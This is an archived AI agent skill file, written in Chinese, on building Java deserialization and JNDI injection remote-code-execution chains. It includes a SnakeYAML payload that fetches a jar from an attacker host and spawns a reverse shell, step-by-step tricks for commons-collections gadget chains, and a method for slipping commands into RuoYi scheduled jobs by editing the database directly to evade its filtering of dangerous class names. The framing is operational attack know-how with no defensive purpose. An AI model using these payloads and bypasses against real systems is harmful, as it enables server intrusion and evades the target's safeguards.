<!-- archived from /root/.hermes/skills/security/java-deserialization-jndi/SKILL.md on 2026-10-21 -->

---
name: java-deserialization-jndi
description: "Use when 构造 Java 反序列化/JNDI 注入 RCE gadget 链。"
version: 1.0.0
tags: [java, deserialization, jndi, gadget, commons-collections, snakeyaml, fastjson, templatesimpl, ruoyi]
---

> 归档卡：原目录 `/root/.hermes/skills/security/java-deserialization-jndi`。卡内 `references/…`、`scripts/…`、`templates/…` 均相对原目录；读取用 `read_file('/root/.hermes/skills/security/java-deserialization-jndi/…')`，不要相对 `references/legacy/` 解析。

# Java 反序列化 / JNDI 注入 RCE

做 Java 反序列化或 JNDI 注入时的实战要点。核心教训：现代 Java 目标（8u191+）下，JNDI 注入和 Commons Collections 链多数被默认封死，先验证再构造，别在废链上烧时间。

## 1. 先验证 gadget 类是否可序列化（别急着造 payload）

- `javap -c -p -cp <jar> <class>` 反编译 `readObject`/`writeObject`，看是否调用 `checkUnsafeSerialization` 或是否实现 `Serializable`。
- **Commons Collections 3.2.2 和 4.4 的 `InvokerTransformer` 序列化都被禁用**：
  - CC 4.4 直接移除了 `InvokerTransformer`/`InstantiateTransformer` 的 `Serializable` 接口。
  - CC 3.2.2 是运行时拦截——`writeObject`/`readObject` 都调用 `FunctorUtils.checkUnsafeSerialization`，需 JVM 属性 `-Dorg.apache.commons.collections.enableUnsafeSerialization=true` 才放行（目标几乎不可能开）。
  - 结论：依赖 InvokerTransformer 的 CC1-CC7 全废，别再用。
- 用 `strings <heapdump>.hprof | grep -oE 'commons-collections[0-9.-]*'` 确认 classpath 里的 CC 版本，再决定链。

## 2. JNDI 注入的两道墙（Java 8u191+）

- `trustURLCodebase=false`（8u191 起默认）拒绝 JNDI 远程类加载 → `javaNamingReference` 指向远程 `.class`/`codebase` 这条路废。
- `javaSerializedData`（LDAP 返回序列化对象，走反序列化）需要本地 gadget，而 CC 链被禁 → 也废。
- 结论：现代 Java 目标优先选别的 RCE 原语，别默认走 JNDI。绕过 trustURLCodebase 的例外是 Tomcat `org.apache.naming.factory.BeanFactory`（本地 classpath 工厂类 + EL 表达式），但依赖目标带内嵌 Tomcat。

## 3. 首选替代：SnakeYAML（Spring Boot 自带，一层调用）

- Spring Boot 2.7.x 默认带 snakeyaml 1.30；`Yaml.load(String)` 是无参构造器 + 单参数实例方法，非常适合反射一层调用触发（CVE-2022-1471）。
- payload：
  ```
  !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker/yaml-payload.jar"]]]]
  ```
- `yaml-payload.jar` 内含 `META-INF/services/javax.script.ScriptEngineFactory`，指向一个实现该接口、**构造器里 `Runtime.exec` 反弹 shell** 的类（`getScriptEngine` 等方法返回 null 即可）。

## 4. 构造 CC 链的坑（如果目标 CC 是旧版可序列化）

- **CC2/CC4（PriorityQueue+TransformingComparator+InvokerTransformer）**：`queue.add()` 会立即触发 `TransformingComparator.compare` → 报 `InvokerTransformer: method on Integer does not exist`。正确顺序：先用无害 `ConstantTransformer(1)` 构造 PriorityQueue 并 `add()`，再反射替换 comparator 的 `transformer` 字段为 `InvokerTransformer("newTransformer")`、替换 queue 元素为 `{templates, templates}`。
- **CC6（HashSet+TiedMapEntry+LazyMap+ChainedTransformer）**：同理先用无害链构造，`add` 后 `lazyMap.remove("foo")` 再反射替换 `ChainedTransformer` 的 `iTransformers`。
- 恶意类须继承 `com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet`（实现两个 `transform` 空方法）才能被 `TemplatesImpl` 加载，命令写在 `static {}` 块。

## 5. 编译/运行 JDK 内部类（Java 17 本机造 payload）

- 用 `TemplatesImpl` 等 `com.sun.org.apache.xalan.internal.*` 内部类，javac/java 需加：
  - `--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`
  - `--add-exports java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED`
- 反射改 `TemplatesImpl._bytecodes`、`PriorityQueue.queue` 需加：
  - `--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED`
  - `--add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc=ALL-UNNAMED`
  - `--add-opens java.base/java.util=ALL-UNNAMED`
- 无 `javac` 时 `apt-get install -y openjdk-17-jdk-headless`；commons-collections jar 从 `repo1.maven.org` 或 `maven.aliyun.com/repository/public` 下。

## 6. RuoYi 定时任务落地（直接改 DB 绕过违规检测）

- `invokeTarget` 格式 `beanName.methodName(params)`；含 `.` 的 beanName 走 `Class.forName(beanName).newInstance()`（`isValidClassName` 判 countMatches(".")>1），故 beanName 可用任意全限定类名（`org.yaml.snakeyaml.Yaml`、`javax.naming.InitialContext`…），不限 Spring bean。
- **违规检测只在 API 层**：`sys_job` 增改接口过滤 Runtime/ProcessBuilder 等危险类名，但**直接改 MySQL 的 `QRTZ_JOB_DETAILS.job_data`（Java 序列化对象，魔数 `aced0005`）可完全绕过**。job_data 内 invokeTarget 是 TC_STRING 字段，替换 = 改 2 字节大端长度前缀 + 内容，前后字节原样保留。
- **params 用 `split(",")` 切割**、不处理引号内逗号 → RCE payload 不能含逗号。SnakeYAML 的 ScriptEngineManager payload 每个 list 单元素，天然无逗号，正好适配。
- 若 Quartz 调度器已停（`QRTZ_SCHEDULER_STATE.last_checkin_time` 距当前远超 checkin 间隔），INSERT 后也不会触发——确认调度器活着再点火。
